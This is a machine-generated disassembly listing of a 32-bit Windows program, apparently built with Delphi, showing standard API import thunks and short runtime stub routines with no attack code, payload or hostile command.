SetThreadLocale
jmp [ __import_lookup_table_6(kernel32:SetThreadLocale) ]
SetThreadPriority
jmp [ __import_lookup_table_6(kernel32:SetThreadPriority) ]
SizeofResource
jmp [ __import_lookup_table_6(kernel32:SizeofResource) ]
sub_406678
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
SuspendThread
jmp [ __import_lookup_table_6(kernel32:SuspendThread) ]
VirtualAlloc
jmp [ __import_lookup_table_6(kernel32:VirtualAlloc) ]
VirtualFree
jmp [ VirtualFree@IAT ]
VirtualProtect
jmp [ VirtualProtect@IAT ]
VirtualQuery
jmp [ __import_lookup_table_6(kernel32:VirtualQuery) ]
WaitForSingleObject
jmp [ __import_lookup_table_6(kernel32:WaitForSingleObject) ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ GetFileVersionInfoSizeA@IAT ]
VerQueryValueA
jmp [ __import_lookup_table_7(version:VerQueryValueA) ]
CombineRgn
jmp [ CombineRgn@IAT ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDIBSection
jmp [ __import_lookup_table_8(gdi32:CreateDIBSection) ]
CreateDIBitmap
jmp [ __import_lookup_table_8(gdi32:CreateDIBitmap) ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePenIndirect
jmp [ __import_lookup_table_8(gdi32:CreatePenIndirect) ]
ExcludeClipRect
jmp [ ExcludeClipRect@IAT ]
ExtTextOutA
jmp [ ExtTextOutA@IAT ]
GetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:GetBrushOrgEx) ]
GetClipBox
jmp [ __import_lookup_table_8(gdi32:GetClipBox) ]
GetCurrentPositionEx
jmp [ __import_lookup_table_8(gdi32:GetCurrentPositionEx) ]
GetDCOrgEx
jmp [ GetDCOrgEx@IAT ]
GetDIBColorTable
jmp [ GetDIBColorTable@IAT ]
GetPixel
jmp [ __import_lookup_table_8(gdi32:GetPixel) ]
GetRgnBox
jmp [ __import_lookup_table_8(gdi32:GetRgnBox) ]
GetTextExtentPoint32A
jmp [ __import_lookup_table_8(gdi32:GetTextExtentPoint32A) ]
GetTextMetricsA
jmp [ __import_lookup_table_8(gdi32:GetTextMetricsA) ]
GetWindowOrgEx
jmp [ GetWindowOrgEx@IAT ]
LineTo
jmp [ __import_lookup_table_8(gdi32:LineTo) ]
MaskBlt
jmp [ MaskBlt@IAT ]
MoveToEx
jmp [ MoveToEx@IAT ]
RectVisible
jmp [ RectVisible@IAT ]
Rectangle
jmp [ __import_lookup_table_8(gdi32:Rectangle) ]
SelectClipRgn
jmp [ __import_lookup_table_8(gdi32:SelectClipRgn) ]
SetBrushOrgEx
jmp [ SetBrushOrgEx@IAT ]
SetDIBColorTable
jmp [ SetDIBColorTable@IAT ]
SetPixel
jmp [ SetPixel@IAT ]
SetROP2
jmp [ SetROP2@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
SetWindowOrgEx
jmp [ SetWindowOrgEx@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ __import_lookup_table_9(user32:ActivateKeyboardLayout) ]
AdjustWindowRectEx
jmp [ AdjustWindowRectEx@IAT ]
CharLowerA
jmp [ CharLowerA@IAT ]
BeginDeferWindowPos
jmp [ BeginDeferWindowPos@IAT ]
BeginPaint
jmp [ BeginPaint@IAT ]
CallNextHookEx
jmp [ __import_lookup_table_9(user32:CallNextHookEx) ]
CallWindowProcA
jmp [ __import_lookup_table_9(user32:CallWindowProcA) ]
CharNextA
jmp [ CharNextA@IAT ]
CharToOemA
jmp [ CharToOemA@IAT ]
CheckMenuItem
jmp [ __import_lookup_table_9(user32:CheckMenuItem) ]
ClientToScreen
jmp [ __import_lookup_table_9(user32:ClientToScreen) ]
CreateIcon
jmp [ __import_lookup_table_9(user32:CreateIcon) ]
CreateMDIWindowA
jmp [ __import_lookup_table_9(user32:CreateMDIWindowA) ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ CreatePopupMenu@IAT ]
DefFrameProcA
jmp [ __import_lookup_table_9(user32:DefFrameProcA) ]
DefWindowProcA
jmp [ __import_lookup_table_9(user32:DefWindowProcA) ]
DeferWindowPos
jmp [ DeferWindowPos@IAT ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ DestroyMenu@IAT ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
DispatchMessageA
jmp [ DispatchMessageA@IAT ]
DrawFocusRect
jmp [ __import_lookup_table_9(user32:DrawFocusRect) ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ __import_lookup_table_9(user32:DrawIconEx) ]
DrawMenuBar
jmp [ __import_lookup_table_9(user32:DrawMenuBar) ]
EnableWindow
jmp [ EnableWindow@IAT ]
EndDeferWindowPos
jmp [ EndDeferWindowPos@IAT ]
EndPaint
jmp [ EndPaint@IAT ]
EnumThreadWindows
jmp [ EnumThreadWindows@IAT ]
EnumWindows
jmp [ EnumWindows@IAT ]
EqualRect
jmp [ EqualRect@IAT ]
FindWindowA
jmp [ FindWindowA@IAT ]
GetClassNameA
jmp [ GetClassNameA@IAT ]
GetClientRect
jmp [ GetClientRect@IAT ]
GetCursor
jmp [ GetCursor@IAT ]
GetCursorPos
jmp [ __import_lookup_table_9(user32:GetCursorPos) ]
GetDC
jmp [ __import_lookup_table_9(user32:GetDC) ]
GetDCEx
jmp [ __import_lookup_table_9(user32:GetDCEx) ]
GetForegroundWindow
jmp [ __import_lookup_table_9(user32:GetForegroundWindow) ]
GetIconInfo
jmp [ GetIconInfo@IAT ]
GetKeyNameTextA
jmp [ __import_lookup_table_9(user32:GetKeyNameTextA) ]
GetKeyboardLayout
jmp [ GetKeyboardLayout@IAT ]
GetKeyboardLayoutList
jmp [ GetKeyboardLayoutList@IAT ]
GetKeyboardState
jmp [ GetKeyboardState@IAT ]
GetLastActivePopup
jmp [ GetLastActivePopup@IAT ]
GetLastInputInfo
jmp [ __import_lookup_table_9(user32:GetLastInputInfo) ]
GetMenu
jmp [ __import_lookup_table_9(user32:GetMenu) ]
GetMenuItemID
jmp [ __import_lookup_table_9(user32:GetMenuItemID) ]
GetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:GetMenuItemInfoA) ]
GetMenuStringA
jmp [ __import_lookup_table_9(user32:GetMenuStringA) ]
__imp_GetWindow
jmp [ GetWindow@IAT ]
GetParent
jmp [ __import_lookup_table_9(user32:GetParent) ]
GetPropA
jmp [ __import_lookup_table_9(user32:GetPropA) ]
GetScrollInfo
jmp [ __import_lookup_table_9(user32:GetScrollInfo) ]
GetSubMenu
jmp [ __import_lookup_table_9(user32:GetSubMenu) ]
GetSysColor
jmp [ __import_lookup_table_9(user32:GetSysColor) ]
GetSysColorBrush
jmp [ __import_lookup_table_9(user32:GetSysColorBrush) ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ __import_lookup_table_9(user32:GetTopWindow) ]
GetWindowDC
jmp [ GetWindowDC@IAT ]
GetWindowPlacement
jmp [ GetWindowPlacement@IAT ]
GetWindowRect
jmp [ GetWindowRect@IAT ]
GetWindowTextA
jmp [ GetWindowTextA@IAT ]
__imp_GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
InsertMenuItemA
jmp [ InsertMenuItemA@IAT ]
InvalidateRect
jmp [ __import_lookup_table_9(user32:InvalidateRect) ]
IsChild
jmp [ __import_lookup_table_9(user32:IsChild) ]
IsDialogMessageA
jmp [ __import_lookup_table_9(user32:IsDialogMessageA) ]
IsRectEmpty
jmp [ IsRectEmpty@IAT ]
IsWindow
jmp [ __import_lookup_table_9(user32:IsWindow) ]
IsWindowEnabled
jmp [ __import_lookup_table_9(user32:IsWindowEnabled) ]
IsZoomed
jmp [ IsZoomed@IAT ]
KillTimer
jmp [ KillTimer@IAT ]
LoadBitmapA
jmp [ __import_lookup_table_9(user32:LoadBitmapA) ]
LoadIconA
jmp [ LoadIconA@IAT ]
LoadStringA
jmp [ LoadStringA@IAT ]
MapVirtualKeyA
jmp [ MapVirtualKeyA@IAT ]
MessageBoxA
jmp [ __import_lookup_table_9(user32:MessageBoxA) ]
MsgWaitForMultipleObjects
jmp [ MsgWaitForMultipleObjects@IAT ]
OemToCharA
jmp [ __import_lookup_table_9(user32:OemToCharA) ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
PtInRect
jmp [ __import_lookup_table_9(user32:PtInRect) ]
RedrawWindow
jmp [ __import_lookup_table_9(user32:RedrawWindow) ]
RegisterClassA
jmp [ __import_lookup_table_9(user32:RegisterClassA) ]
RegisterClipboardFormatA
jmp [ __import_lookup_table_9(user32:RegisterClipboardFormatA) ]
ReleaseCapture
jmp [ __import_lookup_table_9(user32:ReleaseCapture) ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ RemoveMenu@IAT ]
ScrollWindow
jmp [ ScrollWindow@IAT ]
SetActiveWindow
jmp [ __import_lookup_table_9(user32:SetActiveWindow) ]
SetCapture
jmp [ __import_lookup_table_9(user32:SetCapture) ]
SetClassLongA
jmp [ __import_lookup_table_9(user32:SetClassLongA) ]
SetForegroundWindow
jmp [ __import_lookup_table_9(user32:SetForegroundWindow) ]
SetMenuItemInfoA
jmp [ SetMenuItemInfoA@IAT ]
SetParent
jmp [ __import_lookup_table_9(user32:SetParent) ]
SetScrollInfo
jmp [ __import_lookup_table_9(user32:SetScrollInfo) ]
SetScrollRange
jmp [ __import_lookup_table_9(user32:SetScrollRange) ]
SetTimer
jmp [ __import_lookup_table_9(user32:SetTimer) ]
SetWindowPlacement
jmp [ __import_lookup_table_9(user32:SetWindowPlacement) ]
SetWindowTextA
jmp [ SetWindowTextA@IAT ]
SetWindowsHookExA
jmp [ SetWindowsHookExA@IAT ]
ShowCursor
jmp [ ShowCursor@IAT ]
ShowOwnedPopups
jmp [ ShowOwnedPopups@IAT ]
ShowScrollBar
jmp [ ShowScrollBar@IAT ]
TrackPopupMenu
jmp [ __import_lookup_table_9(user32:TrackPopupMenu) ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ __import_lookup_table_9(user32:TranslateMessage) ]
UnhookWindowsHookEx
jmp [ UnhookWindowsHookEx@IAT ]
UnregisterClassA
jmp [ __import_lookup_table_9(user32:UnregisterClassA) ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ WaitMessage@IAT ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
sub_406df0
call GetTickCount
retn
sub_406df8
xor eax eax
retn
sub_406dfc
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_406e0c
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406e28
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_406e3c
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_406e74
call sub_406de0
retn
CreateWindowExA
jmp [ CreateWindowExA@IAT ]
sub_407059
jmp sub_403ae4
sub_407060
pop ebp
retn
sub_407064
sub [ rw-data ] 0x1
retn
sub_407091
jmp sub_403ae4
sub_407098
pop ebp
retn
sub_40709c
sub [ rw-data ] 0x1
retn
sub_4073b9
jmp sub_403ae4
sub_4073c0
pop ebp
retn
sub_4073c4
sub [ rw-data ] 0x1
retn
sub_407ea5
add eax 0xffffffd4
jmp sub_40d428
sub_407ead
add eax 0xffffffd4
jmp sub_40d2d0
sub_407eb5
add eax 0xffffffd4
jmp sub_40d36c
sub_407ec7
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405bd8
sub_407ed1
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405bec
sub_407fa8
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
pop ebx
retn
sub_408750
call sub_40872c
retn
sub_4087e8
push eax
call CloseHandle
retn
sub_408858
push ebx
mov ebx eax
mov eax ebx
call sub_4087f0
inc eax
setne al
pop ebx
retn
sub_4089e8
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_4089fc
push esi
mov esi eax
xchg edx eax
call sub_4028e8
mov eax esi
pop esi
retn
sub_408bbc
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4026ec
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_408bd0
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_408c08
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_40270c
sub_408c70
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402848
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_408c94
push ebx
mov ebx eax
mov eax ebx
call sub_404164
pop ebx
retn
sub_408ff7
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_404164
pop eax
pop ebx
retn
sub_4092af
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_40940a
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_409767
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_409767
sub_409824
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404624
mov edx esi
xor ecx ecx
call sub_4096b0
pop esi
pop ebx
retn
sub_409898
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404624
mov edx esi
mov cl 0x1
call sub_4096b0
pop esi
pop ebx
retn
sub_40a0d6
jmp sub_403ae4
sub_40a0dd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a1ce
jmp sub_403ae4
sub_40a1d5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a979
jmp sub_403ae4
sub_40a980
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40aa20
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a9ac
pop ebp
retn 0x8
sub_40aa34
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xchg edx eax
call sub_40a9ac
pop ebp
retn 0x8
sub_40ab79
jmp sub_403ae4
sub_40ab80
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40b023
jmp sub_403ae4
sub_40b02a
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b543
jmp sub_403ae4
sub_40b54a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b5f5
jmp sub_403ae4
sub_40b5fc
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40b69f
jmp sub_403ae4
sub_40b6a6
pop esi
pop ecx
pop ebp
retn
sub_40b882
jmp sub_403ae4
sub_40b889
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b8e0
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40bbd2
jmp sub_403ae4
sub_40bca0
jmp sub_403ae4
sub_40bcc8
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_40331c
sub_40be64
jmp sub_403ae4
sub_40be6b
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40be74
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_403b1c
sub_40be81
retn
sub_40be84
push ebp
mov ebp esp
call sub_40bdc8
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40be74
pop ebp
retn 0x4
sub_40bea0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
retn
sub_40bf38
push ebx
mov ebx eax
mov eax ebx
call sub_40beb8
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
j_sub_403ae4#5
jmp sub_403ae4
sub_40c112
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40c1d7
jmp sub_403ae4
sub_40c1de
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c1e8
call sub_40ba74
mov eax 0x1
call sub_4040c8
sub_40c36c
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40c445
jmp sub_403ae4
sub_40c462
jmp sub_403ae4
sub_40c469
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40c514
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40c478
mov ecx eax
sub_40c700
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40c720
push eax
call CharNextA
retn
sub_40c9b8
jmp sub_403ae4
sub_40c9bf
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40ca28
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40ce7f
jmp sub_403ae4
sub_40ce86
pop ebx
mov esp ebp
pop ebp
retn
Sleep
jmp [ __import_lookup_table_10(kernel32:Sleep) ]
sub_40cfc4
jmp sub_403ae4
sub_40cfcb
pop ebx
mov esp ebp
pop ebp
retn
sub_40cfd0
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40cf34
sub_40cfe0
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40cffc
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_40270c
pop ebx
retn
sub_40d084
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40d090
xchg [ eax ] edx
mov eax edx
retn
sub_40d0f0
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40d180
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40d298
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40d2c0
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40d53b
jmp sub_403ae4
sub_40d542
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40d5b0
jmp sub_403ae4
sub_40d5b7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d5d5
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40d5ce
jmp sub_403ae4
sub_40d5d5
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40da25
jmp sub_403ae4
sub_40da2c
pop ebp
retn
sub_40da98
jmp sub_403ae4
sub_40da9f
pop ebp
retn
VariantChangeType
jmp [ __import_lookup_table_11(oleaut32:VariantChangeType) ]
sub_40db18
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40db7e
jmp sub_403ae4
sub_40db85
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dbea
jmp sub_403ae4
sub_40dbf1
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dc56
jmp sub_403ae4
sub_40dc5d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dcc2
jmp sub_403ae4
sub_40dcc9
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dd2e
jmp sub_403ae4
sub_40dd35
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40ddad
jmp sub_403ae4
sub_40ddb4
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40de20
jmp sub_403ae4
sub_40de27
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40de90
jmp sub_403ae4
sub_40de97
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40df04
jmp sub_403ae4
sub_40df0b
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ __import_lookup_table_11(oleaut32:SafeArrayCreate) ]
SafeArrayGetLBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetLBound) ]
SafeArrayGetUBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetUBound) ]
sub_40e291
jmp sub_403ae4
sub_40e298
pop ebp
retn
sub_40e29c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40df60
sub_40e2ad
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e936
jmp sub_403ae4
sub_40e9cf
jmp sub_403ae4
sub_40e9d6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ea26
jmp sub_403ae4
sub_40ea2d
pop ecx
pop ebp
retn
sub_40ea7a
jmp sub_403ae4
sub_40ea81
pop ecx
pop ebp
retn
sub_40eb13
jmp sub_403ae4
sub_40eb1a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40eb6a
jmp sub_403ae4
sub_40eb71
pop ecx
pop ebp
retn
sub_40edb9
jmp sub_403ae4
sub_40edc0
pop ebx
mov esp ebp
pop ebp
retn
sub_40eed6
jmp sub_403ae4
sub_40eedd
pop ecx
pop ebp
retn
sub_40eee0
push ebx
mov ebx eax
mov eax ebx
call sub_40f178
mov [ ebx ] 0x1
pop ebx
retn
sub_40f18c
push eax
call sub_40f178
pop eax
retn
sub_40f3ec
call sub_40f4a0
retn
sub_40f540
jmp sub_403ae4
sub_40f547
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f58e
jmp sub_403ae4
sub_40f595
pop ebx
pop ecx
pop ebp
retn
sub_40f5da
jmp sub_403ae4
sub_40f5e1
pop ebx
pop ecx
pop ebp
retn
sub_40f626
jmp sub_403ae4
sub_40f62d
pop ebx
pop ecx
pop ebp
retn
j_sub_403ae4#8
jmp sub_403ae4
sub_40f679
pop ebx
pop ecx
pop ebp
retn
sub_40fa3b
jmp sub_403ae4
sub_40fa42
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40fadc
jmp sub_403ae4
sub_40fae3
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40ff51
jmp sub_403830
sub_41000c
jmp sub_403830
sub_4100b3
jmp sub_403830
j_sub_403830
jmp sub_403830
sub_410285
jmp sub_403830
sub_41036d
jmp sub_403830
sub_41052a
jmp sub_403ae4
sub_410531
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410593
jmp sub_403ae4
sub_41059a
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410a00
jmp sub_403830
sub_410aef
jmp sub_403ae4
sub_410af6
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410b94
jmp sub_403ae4
sub_410b9b
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410f38
call sub_410bf0
neg al
sbb eax eax
neg eax
retn
sub_410ff9
jmp sub_403ae4
sub_411000
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4110a9
jmp sub_403ae4
sub_4110b0
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411601
jmp sub_403830
sub_411708
jmp sub_403ae4
sub_41170f
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411819
jmp sub_403ae4
sub_411820
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411c70
jmp sub_403ae4
sub_411c77
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411d81
jmp sub_403ae4
sub_411d88
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4122ce
jmp sub_403ae4
sub_4122d5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412379
jmp sub_403ae4
sub_412380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4123a2
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40485c
retn
sub_41239b
jmp sub_403ae4
sub_4123a2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4123fe
jmp sub_403ae4
sub_412405
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412481
jmp sub_403ae4
sub_4129c7
jmp sub_403ae4
sub_4129ce
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412a61
jmp sub_403ae4
sub_412a68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412a85
lea eax [ ebp - 0x14 ]
call sub_404844
retn
sub_412a7e
jmp sub_403ae4
sub_412a85
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412ae2
jmp sub_403ae4
sub_412ae9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412b8b
jmp sub_403ae4
sub_412ba8
jmp sub_403ae4
sub_412baf
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41310a
jmp sub_403ae4
sub_413111
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413182
jmp sub_403ae4
sub_413189
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413514
push eax
call sub_40f178
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_413528
push eax
call sub_40f178
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_4136b3
jmp sub_403ae4
sub_4136df
jmp sub_403ae4
sub_4136e6
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413913
jmp sub_403ae4
sub_41391a
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_413bbb
jmp sub_403ae4
sub_413c49
jmp sub_403ae4
sub_413d39
jmp sub_403ae4
sub_413ddb
jmp sub_403ae4
sub_413e91
jmp sub_403ae4
sub_413f38
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40f4a0
add esp 0x10
sub_4141e2
jmp sub_403ae4
sub_4141e9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41422c
mov ax [ eax ]
retn
sub_41432c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40f178
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_414344
mov edx 0x80020004
call sub_41432c
retn
sub_414394
mov dl 0x1
call sub_41439c
retn
sub_414449
jmp sub_403ae4
sub_414450
pop esi
pop ebx
pop ebp
retn
sub_414454
push ebp
mov ebp esp
call sub_414614
pop ebp
retn 0x4
sub_4144e0
push ebp
mov ebp esp
call sub_414614
pop ebp
retn 0x4
sub_4145c3
jmp sub_403ae4
sub_4145ca
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403358
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403704
sub_4145ec
xor eax eax
retn
sub_4145f0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_414604
mov [ ecx ] 0x8
mov al 0x1
retn
sub_41460c
call sub_40e8ec
retn
sub_414614
call sub_40e9dc
retn
sub_41461c
call sub_40ee8c
retn
sub_414624
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_414638
call sub_414614
retn
sub_414640
push ebp
mov ebp esp
call sub_41461c
pop ebp
retn 0x8
sub_414658
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_414734
jmp sub_403ae4
sub_4147fd
jmp sub_403ae4
sub_414804
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414821
lea eax [ ebp - 0x10 ]
call sub_404164
retn
sub_41481a
jmp sub_403ae4
sub_414821
